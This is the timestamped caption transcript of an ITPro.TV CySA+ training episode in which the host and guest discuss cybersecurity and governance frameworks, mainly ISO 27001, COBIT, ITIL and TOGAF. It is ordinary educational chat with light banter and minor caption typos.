You're watching ITPro.TV.\n&gt;&gt; All right,\n\n5\n00:00:12.483 --> 00:00:16.025\ngreetings everyone, welcome back to\nanother great episode of ITPro.TV.\n\n6\n00:00:16.025 --> 00:00:19.505\nI'm your host, Daniel Lowrie,\nand today's episode,\n\n7\n00:00:19.505 --> 00:00:22.557\ntaking a look at furthering\non our CySA+ series.\n\n8\n00:00:22.557 --> 00:00:27.694\nJoining us back for a part 2 on our\nCybersecurity Frameworks, Ms. Jo Peacock.\n\n9\n00:00:27.694 --> 00:00:30.761\nJo, glad to have you back, how's it going?\n&gt;&gt; Absolutely great, thank you, Daniel.\n\n10\n00:00:30.761 --> 00:00:33.037\nHow are you?\n&gt;&gt; I am excellent, thanks for\n\n11\n00:00:33.037 --> 00:00:34.069\nasking as well.\n\n12\n00:00:34.069 --> 00:00:37.645\nBut today, we are trying to finish up\nthese Cyber Security Frameworks that we\n\n13\n00:00:37.645 --> 00:00:41.839\nstarted back in the previous episode.\n&gt;&gt; Right, yeah, in a previous episode, in\n\n14\n00:00:41.839 --> 00:00:45.090\nepisode one, we took a look at ISO 27001-\n&gt;&gt; Interesting\n\n15\n00:00:45.090 --> 00:00:47.791\nstuff.\n&gt;&gt; Stroke 2 which was an international\n\n16\n00:00:47.791 --> 00:00:49.550\nstandard for IT security.\n\n17\n00:00:49.550 --> 00:00:53.985\nAnd then we also looked at NIST\nwhich was the government standard.\n\n18\n00:00:53.985 --> 00:00:58.623\nWell the government framework,\nUS government for cybersecurity as well.\n\n19\n00:00:58.623 --> 00:01:02.999\nSo if you have any questions on\nthat please take a look back\n\n20\n00:01:02.999 --> 00:01:05.008\nat the last episode-\n&gt;&gt; [LAUGH]\n\n21\n00:01:05.008 --> 00:01:05.700\n&gt;&gt; Episode one,\n\n22\n00:01:05.700 --> 00:01:09.182\nbecause I'm not explaining it all again.\n&gt;&gt; Not doing it again, you can't make it.\n\n23\n00:01:09.182 --> 00:01:09.993\n&gt;&gt; [LAUGH] Definitely not.\n\n24\n00:01:09.993 --> 00:01:14.815\nOne thing that I do wanna mention though,\nis ISO 27001 is kind of and\n\n25\n00:01:14.815 --> 00:01:18.373\nI don't understand why,\nI will be honest with you but\n\n26\n00:01:18.373 --> 00:01:21.714\nit's kind of a it's in deterioration,\nI think.\n\n27\n00:01:21.714 --> 00:01:24.440\nThere's not so much of a hunger for\n\n28\n00:01:24.440 --> 00:01:29.424\nobtaining international standard\naccreditation right now.\n\n29\n00:01:29.424 --> 00:01:33.840\nWe're in 2018 and\nthe hunger seems to have died down.\n\n30\n00:01:33.840 --> 00:01:37.022\nNow I’m not too sure why,\nbecause there's always\n\n31\n00:01:37.022 --> 00:01:41.394\na requirement on organizations to\ndemonstrate that they are secure.\n\n32\n00:01:41.394 --> 00:01:43.560\nI mean we've got things like GDPR,\netc, and\n\n33\n00:01:43.560 --> 00:01:46.980\nthere's always a requirement on\norganizations to demonstrate that.\n\n34\n00:01:46.980 --> 00:01:52.698\nAnd yet it seems to me that, I think\nit might be because of the difficulty.\n\n35\n00:01:52.698 --> 00:01:55.680\nThe difficulty in achieving the standard.\n&gt;&gt; So\n\n36\n00:01:55.680 --> 00:02:00.949\nthe water is coming down to a slower boil?\n&gt;&gt; Right, yeah, yeah, but then at the same\n\n37\n00:02:00.949 --> 00:02:07.071\ntime [LAUGH] obviously, I'm gonna be a big\nadvocate for frameworks and standards.\n\n38\n00:02:07.071 --> 00:02:08.988\nI mean let's face it I\nwouldn't be here if I\n\n39\n00:02:08.988 --> 00:02:09.770\nwasn't.\n&gt;&gt; Yeah.\n\n40\n00:02:09.770 --> 00:02:12.609\n[LAUGH]\n&gt;&gt; So I'm always gonna feel slighly\n\n41\n00:02:12.609 --> 00:02:16.943\nreluctant to see any downward turn,\nbut then I can understand why,\n\n42\n00:02:16.943 --> 00:02:18.830\nit's a lot to achieve.\n&gt;&gt; Well,\n\n43\n00:02:18.830 --> 00:02:20.857\nit sems like the pendulum swing anyway.\n\n44\n00:02:20.857 --> 00:02:24.966\nWe tend to get a little complacent,\nwe've been good and secure for a while.\n\n45\n00:02:24.966 --> 00:02:25.962\nWe can kinda-\n&gt;&gt; Yeah.\n\n46\n00:02:25.962 --> 00:02:27.229\n&gt;&gt; Let off the gas with that, and\n\n47\n00:02:27.229 --> 00:02:28.052\nwhat does that do?\n\n48\n00:02:28.052 --> 00:02:30.688\nIt makes us less secure, and therefore,\ncompromise security [INAUDIBLE].\n\n49\n00:02:30.688 --> 00:02:32.194\nWe gotta do something about this.\n&gt;&gt; Yeah.\n\n50\n00:02:32.194 --> 00:02:33.772\n&gt;&gt; And then the gas goes back down,\n\n51\n00:02:33.772 --> 00:02:34.495\nright?\n&gt;&gt; Well,\n\n52\n00:02:34.495 --> 00:02:37.997\ninternational standards are updated\nevery seven years anyway or thereabouts.\n\n53\n00:02:37.997 --> 00:02:40.552\nAnd so it's about time-\n&gt;&gt; That seems like an epoch in digital\n\n54\n00:02:40.552 --> 00:02:42.327\ntime, right?\n&gt;&gt; I know, right?\n\n55\n00:02:42.327 --> 00:02:44.655\nYeah, it does nowadays.\n&gt;&gt; Yeah.\n\n56\n00:02:44.655 --> 00:02:46.782\n&gt;&gt; When some of the international\n\n57\n00:02:46.782 --> 00:02:50.952\nstandards first came about,\nwhen the IEC first came about,\n\n58\n00:02:50.952 --> 00:02:53.260\nthey decided on that time frame.\n\n59\n00:02:53.260 --> 00:02:56.299\nLike you say, I mean seven\nyears is just a huge amount of\n\n60\n00:02:56.299 --> 00:02:56.965\ntime.\n&gt;&gt; Yeah.\n\n61\n00:02:56.965 --> 00:02:57.542\n&gt;&gt; But anyway,\n\n62\n00:02:57.542 --> 00:02:59.331\nlet's get on with our frameworks then.\n\n63\n00:02:59.331 --> 00:03:02.695\nSo can you remember what the difference\nbetween a framework and a standard was?\n\n64\n00:03:02.695 --> 00:03:03.555\n&gt;&gt; All right,\n\n65\n00:03:03.555 --> 00:03:06.653\nlet me see if I can do\nmy teacher proud here.\n\n66\n00:03:06.653 --> 00:03:12.063\nThe framework are the end goal\nachievements that we are looking to attain\n\n67\n00:03:12.063 --> 00:03:20.600\nor as the standards are how we attain.\n&gt;&gt; I don't know what to say,\n\n68\n00:03:20.600 --> 00:03:21.863\nyou got it the wrong way around.\n\n69\n00:03:24.056 --> 00:03:25.975\nDon't you do that, you've got a test,\n\n70\n00:03:25.975 --> 00:03:27.058\ndon't you do that.\n&gt;&gt; So\n\n71\n00:03:27.058 --> 00:03:29.078\nthe standards are the end goals.\n&gt;&gt; Right,\n\n72\n00:03:29.078 --> 00:03:31.507\nthe standards what we gonna achieve.\n&gt;&gt; Right cuz I thought you\n\n73\n00:03:31.507 --> 00:03:33.567\nwere saying ISO 27001.\n&gt;&gt; This is standard.\n\n74\n00:03:33.567 --> 00:03:34.416\n&gt;&gt; It's a standard,\n\n75\n00:03:34.416 --> 00:03:36.237\nI thought it was a framework.\n&gt;&gt; No.\n\n76\n00:03:36.237 --> 00:03:37.394\n&gt;&gt; That was the confusion.\n\n77\n00:03:37.394 --> 00:03:38.347\n&gt;&gt; The framework is elegant.\n\n78\n00:03:38.347 --> 00:03:39.156\n&gt;&gt; I'm good to go now.\n\n79\n00:03:39.156 --> 00:03:39.898\n&gt;&gt; Remember I said today was\n\n80\n00:03:39.898 --> 00:03:41.266\nthe [CROSSTALK].\n&gt;&gt; That's why I brought\n\n81\n00:03:41.266 --> 00:03:41.878\nher in.\n&gt;&gt; Yeah.\n\n82\n00:03:41.878 --> 00:03:43.075\n&gt;&gt; That's why I got her here.\n\n83\n00:03:43.075 --> 00:03:44.939\nYou gotta untwist my noggin.\n&gt;&gt; And\n\n84\n00:03:44.939 --> 00:03:46.663\nI will show no mercy.\n&gt;&gt; As you shouldn't, no [INAUDIBLE].\n\n85\n00:03:46.663 --> 00:03:47.292\n[LAUGH]\n&gt;&gt; But\n\n86\n00:03:47.292 --> 00:03:50.432\nthen anybody that knows me will\nknow that as well, so that's okay.\n\n87\n00:03:50.432 --> 00:03:53.687\nYou've seen me before,\nyou know that I'm not very lenient.\n\n88\n00:03:53.687 --> 00:03:55.340\nHe's just beginning to learn this.\n\n89\n00:03:55.340 --> 00:03:56.693\nBless him.\n\n90\n00:03:56.693 --> 00:03:59.507\nSo let's take a look then at what-\n&gt;&gt; You know I hate compliance.\n\n91\n00:03:59.507 --> 00:04:01.652\n&gt;&gt; [LAUGH] Yeah, that's why I'm here.\n\n92\n00:04:01.652 --> 00:04:02.904\n&gt;&gt; I hate to be compliant with compliance.\n\n93\n00:04:02.904 --> 00:04:04.032\n&gt;&gt; This is why I'm here.\n\n94\n00:04:04.032 --> 00:04:04.644\n&gt;&gt; That's right.\n\n95\n00:04:04.644 --> 00:04:06.631\n&gt;&gt; So what we're gonna do now is we're\n\n96\n00:04:06.631 --> 00:04:08.427\ngonna take a look at framework.\n\n97\n00:04:08.427 --> 00:04:13.429\nSo if you remember, I said to you in the\nlast episode that frameworks will help us,\n\n98\n00:04:13.429 --> 00:04:16.908\nthey're not gonna give us a magic\nwand that we can wave and\n\n99\n00:04:16.908 --> 00:04:18.521\neverything will be okay.\n\n100\n00:04:18.521 --> 00:04:21.542\nThey're not plug and play,\nand as Daniel, he said,\n\n101\n00:04:21.542 --> 00:04:24.778\nit's not a one size fits all\napproach on any frame at all.\n\n102\n00:04:24.778 --> 00:04:29.082\nBut a framework if tailored to your\norganization will help us to achieve\n\n103\n00:04:29.082 --> 00:04:33.746\nan international standard or will help\nus to achieve compliance with any sort\n\n104\n00:04:33.746 --> 00:04:37.140\nof regulations and\nany requirements by our customers.\n\n105\n00:04:37.140 --> 00:04:42.146\nSo for instance, if you are a supplier\nto the government for instance then\n\n106\n00:04:42.146 --> 00:04:47.089\nyou will have to achieve certain\ncriteria and a framework will help you.\n\n107\n00:04:47.089 --> 00:04:51.801\nSo let's look at COBIT then,\nCOBIT stands for Controlled Objectives for\n\n108\n00:04:51.801 --> 00:04:54.462\nInformation and Related Technologies.\n\n109\n00:04:54.462 --> 00:04:55.558\nSo it's-\n&gt;&gt; I thought this\n\n110\n00:04:55.558 --> 00:04:56.259\nwas a mouthful.\n\n111\n00:04:56.259 --> 00:04:56.827\n&gt;&gt; Yeah-\n&gt;&gt; [LAUGH]\n\n112\n00:04:56.827 --> 00:04:57.381\n&gt;&gt; I know right?\n\n113\n00:04:57.381 --> 00:04:58.661\nAnd we're not gonna go to all of them,\n\n114\n00:04:58.661 --> 00:04:59.631\ndon't worry.\n&gt;&gt; [LAUGH]\n\n115\n00:04:59.631 --> 00:05:01.207\n&gt;&gt; You dont need to remember that.\n\n116\n00:05:01.207 --> 00:05:06.960\nBut it's basically, it was a framework\nthat was originally designed for\n\n117\n00:05:06.960 --> 00:05:12.720\nthe finance arena for IT auditors and\nit's focused on governance.\n\n118\n00:05:12.720 --> 00:05:15.625\nSo it's not necessarily\nfocused on the detail.\n\n119\n00:05:15.625 --> 00:05:19.279\nThis is how you do something,\nit's focused on IT governance.\n\n120\n00:05:19.279 --> 00:05:24.703\nAnd there's a set 36 processors that\nare divided into four areas, plan and\n\n121\n00:05:24.703 --> 00:05:30.803\norganize, acquire and implement, deliver\nand support, and monitor and evaluate.\n\n122\n00:05:30.803 --> 00:05:33.700\nAnd so we got 36 processors as I've said.\n\n123\n00:05:33.700 --> 00:05:36.000\nNow we're not gonna go\ninto any great detail.\n\n124\n00:05:36.000 --> 00:05:40.793\nAnd it's quite funny cuz whenever I say to\npeople, it's concerned with governance.\n\n125\n00:05:40.793 --> 00:05:42.631\nAnd I say, it's at a high level,\n\n126\n00:05:42.631 --> 00:05:45.995\nit's not a great detailed\noperating procedure type level.\n\n127\n00:05:45.995 --> 00:05:47.503\nAnd then I start talking\nabout 36 processes-\n\n128\n00:05:47.503 --> 00:05:48.381\n&gt;&gt; Yeah, 36.\n\n129\n00:05:48.381 --> 00:05:50.219\n[LAUGH]\n&gt;&gt; And then how is that, right?\n\n130\n00:05:50.219 --> 00:05:50.754\n&gt;&gt; Hold on Jo.\n\n131\n00:05:50.754 --> 00:05:51.285\n&gt;&gt; [LAUGH]\n\n132\n00:05:51.285 --> 00:05:52.462\n&gt;&gt; It's just me,\n\n133\n00:05:52.462 --> 00:05:56.271\n36 seems like a large\nnumber in relative terms.\n\n134\n00:05:56.271 --> 00:05:57.940\n[LAUGH]\n&gt;&gt; Right, it does, yeah, but\n\n135\n00:05:57.940 --> 00:05:59.870\nit really is focused on the governance.\n\n136\n00:05:59.870 --> 00:06:03.776\nIt's looking at managing stakeholder\nneeds and it's sort of the enter and\n\n137\n00:06:03.776 --> 00:06:06.881\noverall picture,\nthat's what they're looking at here.\n\n138\n00:06:06.881 --> 00:06:11.069\nSo we want an integrated framework,\nwe want a holistic approach but\n\n139\n00:06:11.069 --> 00:06:13.205\nit's very much at a higher level.\n\n140\n00:06:13.205 --> 00:06:17.019\nAnd it's actually separating\nthe governance from management, and\n\n141\n00:06:17.019 --> 00:06:18.671\nthat's the important part.\n\n142\n00:06:18.671 --> 00:06:22.136\nIf we look at ITIL, and\nI'm quite often asked how COBIT and\n\n143\n00:06:22.136 --> 00:06:23.777\nITIL can work to together.\n\n144\n00:06:23.777 --> 00:06:27.862\nWell, really easy because I've put COBIT\nin the service strategy part of ITIL.\n\n145\n00:06:27.862 --> 00:06:32.668\nAnd so we don't have right\nnow at time of recording, but\n\n146\n00:06:32.668 --> 00:06:35.340\nwe will have a series on COBIT.\n\n147\n00:06:35.340 --> 00:06:39.420\nAnd we're gonna have another series on\nTOGAF as well which is our next slide\n\n148\n00:06:39.420 --> 00:06:40.080\ncoming up.\n\n149\n00:06:40.080 --> 00:06:43.107\nBut COBIT is very much\nin the strategy realm,\n\n150\n00:06:43.107 --> 00:06:46.462\nit's very much at\nthe governance side of things.\n\n151\n00:06:46.462 --> 00:06:51.137\nGovernance is about leadership,\nwhereas management is about actually doing\n\n152\n00:06:51.137 --> 00:06:55.450\nthe work, it's managing the people\nthat are doing the work.\n\n153\n00:06:55.450 --> 00:06:59.550\nSo governance is about leadership,\nso yes, in a very,\n\n154\n00:06:59.550 --> 00:07:05.700\nvery large organisation COBIT and ITIL\nwill work really, really well together.\n\n155\n00:07:05.700 --> 00:07:11.077\nDo you need COBIT and\nITIL together in a small organization?\n\n156\n00:07:11.077 --> 00:07:15.122\nThere's a big question, there's a big\ndifference between need and want,\n\n157\n00:07:15.122 --> 00:07:16.395\nbecause do you need it?\n\n158\n00:07:16.395 --> 00:07:18.190\nNo, not at all.\n\n159\n00:07:18.190 --> 00:07:19.150\nDo you want it?\n\n160\n00:07:19.150 --> 00:07:22.024\nYou might, but\nit depends on your organization.\n\n161\n00:07:22.024 --> 00:07:25.209\nIf your organization is focused\nin the finance industry,\n\n162\n00:07:25.209 --> 00:07:29.244\nthen it's probably a good idea to at\nleast consider some COBIT elements.\n\n163\n00:07:29.244 --> 00:07:31.158\n&gt;&gt; So you would suggest that if you can\n\n164\n00:07:31.158 --> 00:07:32.668\nget away with it?\n&gt;&gt; I would suggest\n\n165\n00:07:32.668 --> 00:07:33.224\nsome elements.\n\n166\n00:07:33.224 --> 00:07:34.118\n&gt;&gt; Yeah.\n&gt;&gt; Some\n\n167\n00:07:34.118 --> 00:07:34.874\nelements.\n&gt;&gt; Some elements?\n\n168\n00:07:34.874 --> 00:07:35.860\n&gt;&gt; So not all of it, but\n\n169\n00:07:35.860 --> 00:07:38.474\nbear in mind though what we\nalways wanna focus on, and\n\n170\n00:07:38.474 --> 00:07:42.151\nthe whole idea of a framework is to\nprovide benefits for the organization.\n\n171\n00:07:42.151 --> 00:07:45.090\nAnd so the one thing I hate-\n&gt;&gt; If it's not\n\n172\n00:07:45.090 --> 00:07:46.374\nproviding a benefit, then-\n\n173\n00:07:46.374 --> 00:07:46.969\n&gt;&gt; Right.\n&gt;&gt; Right.\n\n174\n00:07:46.969 --> 00:07:47.471\n&gt;&gt; Why have you got\n\n175\n00:07:47.471 --> 00:07:48.097\nit?\n&gt;&gt; Right.\n\n176\n00:07:48.097 --> 00:07:49.957\n&gt;&gt; Yeah, one of the things that I got\n\n177\n00:07:49.957 --> 00:07:51.763\nasked a question the other day.\n\n178\n00:07:51.763 --> 00:07:53.563\nWell actually,\nyou got asked the same question, but\n\n179\n00:07:53.563 --> 00:07:55.122\nI don't know that you read it.\n&gt;&gt; [LAUGH]\n\n180\n00:07:55.122 --> 00:07:56.909\n&gt;&gt; So [LAUGH] there was an email that\n\n181\n00:07:56.909 --> 00:07:59.878\nwe got that asked us what\nour biggest pet peeve was?\n\n182\n00:07:59.878 --> 00:08:01.662\nDo you remember that?\n&gt;&gt; I didn't see it, yeah.\n\n183\n00:08:01.662 --> 00:08:02.199\n&gt;&gt; You did.\n\n184\n00:08:02.199 --> 00:08:02.873\n&gt;&gt; I did.\n\n185\n00:08:02.873 --> 00:08:03.407\n&gt;&gt; You did.\n\n186\n00:08:03.407 --> 00:08:04.007\n&gt;&gt; Okay.\n\n187\n00:08:04.007 --> 00:08:04.784\n&gt;&gt; You just ignored it..\n\n188\n00:08:04.784 --> 00:08:06.388\n&gt;&gt; My biggest pet peeve is getting emails\n\n189\n00:08:06.388 --> 00:08:09.042\nasking me what my biggest pet peeve is.\n&gt;&gt; [LAUGH]\n\n190\n00:08:09.042 --> 00:08:11.413\n&gt;&gt; [LAUGH] Kidding, kidding.\n\n191\n00:08:11.413 --> 00:08:11.940\n&gt;&gt; [LAUGH]\n\n192\n00:08:11.940 --> 00:08:13.180\n&gt;&gt; Just, it was right there,\n\n193\n00:08:13.180 --> 00:08:14.378\nI had to hit it, right?\n\n194\n00:08:14.378 --> 00:08:16.110\n[LAUGH]\n&gt;&gt; My biggest pet peeve\n\n195\n00:08:16.110 --> 00:08:17.940\nis actually inefficiency.\n\n196\n00:08:17.940 --> 00:08:20.890\nI cannot stand bureaucracy,\nI hate bureaucracy.\n\n197\n00:08:20.890 --> 00:08:22.510\n&gt;&gt; I will totally agree with you on that.\n\n198\n00:08:22.510 --> 00:08:25.830\nWe have made fun of the red\ntape gun this entire series.\n\n199\n00:08:25.830 --> 00:08:28.280\n&gt;&gt; Right, and you know what?\n\n200\n00:08:28.280 --> 00:08:32.310\nPeople will assume that frameworks will\nbring in bureaucracy, absolutely not.\n\n201\n00:08:32.310 --> 00:08:34.960\nThe idea of a framework,\nif it's implemented correctly,\n\n202\n00:08:34.960 --> 00:08:36.770\nit will eliminate bureaucracy.\n\n203\n00:08:36.770 --> 00:08:38.590\nThat's what it's supposed to do.\n&gt;&gt; Not just reduce, but\n\n204\n00:08:38.590 --> 00:08:40.220\neliminate?\n&gt;&gt; Bureaucracy and\n\n205\n00:08:40.220 --> 00:08:42.860\nred tape, yes.\n&gt;&gt; So now you're starting to make me like\n\n206\n00:08:42.860 --> 00:08:44.240\nthese things.\n&gt;&gt; Yeah.\n\n207\n00:08:44.240 --> 00:08:44.910\n&gt;&gt; Stop it, right now.\n\n208\n00:08:44.910 --> 00:08:47.528\n&gt;&gt; [LAUGH] I know I'm leading him down\n\n209\n00:08:47.528 --> 00:08:49.382\ninto-\n&gt;&gt; You devil, you.\n\n210\n00:08:49.382 --> 00:08:50.800\n&gt;&gt; A deep and dark place.\n\n211\n00:08:50.800 --> 00:08:51.915\n&gt;&gt; [LAUGH] You bewitched me.\n\n212\n00:08:51.915 --> 00:08:54.550\n[LAUGH]\n&gt;&gt; I absolutely hate bureaucracy.\n\n213\n00:08:54.550 --> 00:08:57.800\nIf you ever have to do anything\nwith me on a personal basis,\n\n214\n00:08:57.800 --> 00:09:02.940\nyou will find out that I cannot\ntolerate inefficiency at all.\n\n215\n00:09:02.940 --> 00:09:06.650\nI really, really hate it, and anything\nthat just seems to be inefficient,\n\n216\n00:09:06.650 --> 00:09:09.440\nyou'll find me standing\nthere screaming about.\n\n217\n00:09:09.440 --> 00:09:13.420\nAnd that's purely because\nI spend my entire life\n\n218\n00:09:13.420 --> 00:09:18.220\nkind of preaching about the fact that no,\nwe're trying to eliminate bureaucracy.\n\n219\n00:09:18.220 --> 00:09:21.070\nWe're trying to eliminate red tape, and\n\n220\n00:09:21.070 --> 00:09:24.390\nwe're trying to reduce any\nsort of inefficiencies.\n\n221\n00:09:24.390 --> 00:09:25.880\nWe're pretty much down to zero.\n\n222\n00:09:25.880 --> 00:09:28.620\nIf you're bringing in COBIT and\nyou're bringing in ITIL,\n\n223\n00:09:28.620 --> 00:09:32.000\nthat suggests to me that you're\nusing a sledgehammer to crack a nut.\n\n224\n00:09:32.000 --> 00:09:34.430\nRight, that's not really what we wanna do.\n\n225\n00:09:34.430 --> 00:09:37.530\nSo there's a difference between need and\nwant.\n\n226\n00:09:37.530 --> 00:09:39.450\nCan you do it, yes, you can.\n\n227\n00:09:39.450 --> 00:09:41.557\nDo you need to, no, you don't.\n\n228\n00:09:41.557 --> 00:09:46.396\nBut you might want to, within a large\norganization, you might want to\n\n229\n00:09:46.396 --> 00:09:49.670\ncombine COBIT with something else.\n&gt;&gt; Okay.\n\n230\n00:09:49.670 --> 00:09:51.640\n&gt;&gt; And that brings me into TOGAF.\n\n231\n00:09:51.640 --> 00:09:53.740\nAnd TOGAF is, well, as it says here,\n\n232\n00:09:53.740 --> 00:09:58.900\nan enterprise architecture standard\ndesigned to improve business efficiency.\n\n233\n00:09:58.900 --> 00:10:02.560\nAnd here again, we're looking at a very,\nvery high level.\n\n234\n00:10:02.560 --> 00:10:07.639\nAnd we're looking at the implementation\nof a framework that will deliver.\n\n235\n00:10:07.639 --> 00:10:11.748\nWell, we're focusing on\nbusiness efficiency here, so\n\n236\n00:10:11.748 --> 00:10:15.260\nwe're focusing on value to the business.\n\n237\n00:10:15.260 --> 00:10:22.250\nAnd we're focusing on how our IT all\ntogether can improve the business life.\n\n238\n00:10:22.250 --> 00:10:24.220\nThat's what we're focused on.\n\n239\n00:10:24.220 --> 00:10:29.100\nSo what we're trying to\nget to is to a place where\n\n240\n00:10:29.100 --> 00:10:32.400\nwe work very closely with the business,\nwith the organization.\n\n241\n00:10:32.400 --> 00:10:34.540\nWe have a god relationship\nwith the business.\n\n242\n00:10:34.540 --> 00:10:38.576\nAnd we collectively look at IT to say,\nhow can IT collectively,\n\n243\n00:10:38.576 --> 00:10:42.813\nholistically improve that?\n&gt;&gt; This seems like where IT almost becomes\n\n244\n00:10:42.813 --> 00:10:45.737\nthe immune system of\nthe body of the organization\n\n245\n00:10:45.737 --> 00:10:46.800\nitself.\n&gt;&gt; Right.\n\n246\n00:10:46.800 --> 00:10:49.740\n&gt;&gt; Always trying to fight off the evil\n\n247\n00:10:49.740 --> 00:10:53.900\nviruses and bacteria that come\nin to try to bring it down.\n\n248\n00:10:53.900 --> 00:10:57.440\nWe're trying to diminish that and\nreduce it down to nothing,\n\n249\n00:10:57.440 --> 00:11:01.000\nif at all possible.\n&gt;&gt; Yeah, we're not concerned necessarily\n\n250\n00:11:01.000 --> 00:11:03.750\nwith process here.\n&gt;&gt; Right.\n\n251\n00:11:03.750 --> 00:11:05.460\n&gt;&gt; This is all about looking at IT,\n\n252\n00:11:05.460 --> 00:11:09.810\nit's about looking at the technologies\nas a whole and saying, okay,\n\n253\n00:11:09.810 --> 00:11:11.360\nwhat technologies have we got?\n\n254\n00:11:11.360 --> 00:11:15.819\nAnd how is a whole of IT contributing\nto the needs of the business?\n\n255\n00:11:15.819 --> 00:11:20.150\nAnd so here we're looking at, well,\nit's divided into seven parts.\n\n256\n00:11:20.150 --> 00:11:23.484\nAnd so the first one is kind of an admin\npart where we're articulating terms and\n\n257\n00:11:23.484 --> 00:11:24.152\ndefinitions.\n\n258\n00:11:24.152 --> 00:11:28.903\nAnd this is something that we\ndo commonly miss within IT.\n\n259\n00:11:28.903 --> 00:11:33.533\nAnd in fact, I was just talking to\nanother one of our edutainers here,\n\n260\n00:11:33.533 --> 00:11:37.691\nJustin, the other day about,\nIf we don't have this in place,\n\n261\n00:11:37.691 --> 00:11:40.595\nif we don't have a common language, well,\n\n262\n00:11:40.595 --> 00:11:44.270\nthings can mean different things.\n&gt;&gt; Right, it's easy to talk past each\n\n263\n00:11:44.270 --> 00:11:47.210\nother at that point, right?\n&gt;&gt; Right, but, okay,\n\n264\n00:11:47.210 --> 00:11:49.265\nlet me ask you a question then.\n&gt;&gt; Sure.\n\n265\n00:11:49.265 --> 00:11:50.955\n&gt;&gt; Because you have never,\n\n266\n00:11:50.955 --> 00:11:53.845\never, you've never been in\na studio with me before.\n\n267\n00:11:53.845 --> 00:11:56.760\nOther than that [CROSSTALK]\n&gt;&gt; This is our first actual on-screen\n\n268\n00:11:56.760 --> 00:11:58.119\nperformance.\n&gt;&gt; So I-\n\n269\n00:11:58.119 --> 00:11:59.605\n&gt;&gt; [LAUGH]\n\n270\n00:11:59.605 --> 00:12:00.951\n&gt;&gt; Yeah, that's a bit scary, isn't it?\n\n271\n00:12:00.951 --> 00:12:01.491\n&gt;&gt; [LAUGH]\n\n272\n00:12:01.491 --> 00:12:02.598\n&gt;&gt; So I'm going to ask you\n\n273\n00:12:02.598 --> 00:12:03.965\na question, okay.\n\n274\n00:12:03.965 --> 00:12:10.140\nIf I told you, then, that you are going\nto have to go away and revise your notes\n\n275\n00:12:10.140 --> 00:12:11.740\nnow because you have a test tomorrow.\n&gt;&gt; Okay.\n\n276\n00:12:11.740 --> 00:12:12.632\n&gt;&gt; What would you do?\n\n277\n00:12:12.632 --> 00:12:14.662\n&gt;&gt; What would I do if I had to go away and\n\n278\n00:12:14.662 --> 00:12:16.412\nrevise my notes because I have\n\n279\n00:12:16.412 --> 00:12:17.930\ntest tomorrow?\n&gt;&gt; Right.\n\n280\n00:12:17.930 --> 00:12:19.528\n&gt;&gt; I would probably make them more\n\n281\n00:12:19.528 --> 00:12:22.066\ncondensed.\n&gt;&gt; So you're gonna change them,\n\n282\n00:12:22.066 --> 00:12:22.950\nright?\n&gt;&gt; Yes.\n\n283\n00:12:22.950 --> 00:12:24.070\n&gt;&gt; That's not what I asked you to do.\n\n284\n00:12:24.070 --> 00:12:25.249\n&gt;&gt; You told me to revise them.\n\n285\n00:12:25.249 --> 00:12:26.920\n&gt;&gt; Right.\n\n286\n00:12:26.920 --> 00:12:28.650\n&gt;&gt; Which means to change.\n\n287\n00:12:28.650 --> 00:12:31.353\n&gt;&gt; No it doesn't, it means to look again.\n\n288\n00:12:31.353 --> 00:12:32.881\n&gt;&gt; Does it really?\n\n289\n00:12:32.881 --> 00:12:33.719\n&gt;&gt; It means to study, yeah.\n\n290\n00:12:33.719 --> 00:12:36.270\nThere are two dictionary\ndefinitions of the word revise.\n\n291\n00:12:36.270 --> 00:12:37.517\n&gt;&gt; Interesting, I never knew that revise\n\n292\n00:12:37.517 --> 00:12:38.592\nhad that definition.\n&gt;&gt; Right,\n\n293\n00:12:38.592 --> 00:12:41.280\nthere are two dictionary\ndefinitions of the word revise.\n\n294\n00:12:41.280 --> 00:12:44.578\nOne means to change and\none means to study.\n\n295\n00:12:44.578 --> 00:12:49.706\nIn the UK we use the one\nto study as a default.\n\n296\n00:12:49.706 --> 00:12:54.700\nIn the US,\nwe use the word change as our default.\n\n297\n00:12:55.810 --> 00:12:57.640\nAnd I use that as an example-\n&gt;&gt; That was a great example.\n\n298\n00:12:57.640 --> 00:12:58.690\n&gt;&gt; All the time.\n\n299\n00:12:58.690 --> 00:13:02.636\nBecause if I put that in an email to you,\nand I asked you to go away and\n\n300\n00:13:02.636 --> 00:13:07.311\ndo something, then you would produce one\nthing that I hadn't asked you to do.\n\n301\n00:13:07.311 --> 00:13:09.860\nAnd how inefficient would that be?\n&gt;&gt; Very.\n\n302\n00:13:09.860 --> 00:13:11.205\n&gt;&gt; Right, and yet we assume-\n\n303\n00:13:11.205 --> 00:13:12.070\n&gt;&gt; Wasted a bunch of time, yeah.\n\n304\n00:13:12.070 --> 00:13:14.310\n&gt;&gt; That we're talking that same language.\n\n305\n00:13:14.310 --> 00:13:16.399\nThis is why it's really important to\nget that first one out of the way..\n\n306\n00:13:16.399 --> 00:13:17.573\n&gt;&gt; So, you don't speak English, I knew it.\n\n307\n00:13:17.573 --> 00:13:20.058\nShe doesn't speak English at all.\n&gt;&gt; No, no,\n\n308\n00:13:20.058 --> 00:13:20.906\n&gt;&gt; [LAUGH]\n\n309\n00:13:20.906 --> 00:13:22.653\n&gt;&gt; Not at all, no, my English-\n\n310\n00:13:22.653 --> 00:13:24.320\n&gt;&gt; [LAUGH]\n\n311\n00:13:24.320 --> 00:13:25.400\n&gt;&gt; Is absolutely\n\n312\n00:13:25.400 --> 00:13:26.179\nappalling.\n&gt;&gt; It is.\n\n313\n00:13:26.179 --> 00:13:27.143\n&gt;&gt; Clearly, yeah.\n\n314\n00:13:27.143 --> 00:13:27.706\n&gt;&gt; [LAUGH]\n\n315\n00:13:27.706 --> 00:13:29.490\n&gt;&gt; [LAUGH] So, this is why that first part\n\n316\n00:13:29.490 --> 00:13:33.363\nis really, really important, to have\nthose standard terms and definitions.\n\n317\n00:13:33.363 --> 00:13:37.269\nBecause if we don't, we might assume\nthat we're speaking the same language,\n\n318\n00:13:37.269 --> 00:13:40.690\nbut actually we have\nan inefficient relationship.\n\n319\n00:13:40.690 --> 00:13:44.060\nYou see that I like to focus\non efficiencies, you see?.\n\n320\n00:13:44.060 --> 00:13:48.040\nSo then what we wanna do then is we wanna\ncreate an architecture developing module,\n\n321\n00:13:48.040 --> 00:13:52.620\nand that means a step-by-step approach\nto developing our architecture.\n\n322\n00:13:52.620 --> 00:13:55.411\nLet's look at what we've got,\nlet's look at what's redundant.\n\n323\n00:13:55.411 --> 00:13:58.299\nAnd again that's another word,\nby the way, redundancy,\n\n324\n00:13:58.299 --> 00:14:01.935\ndo you know what redundancy 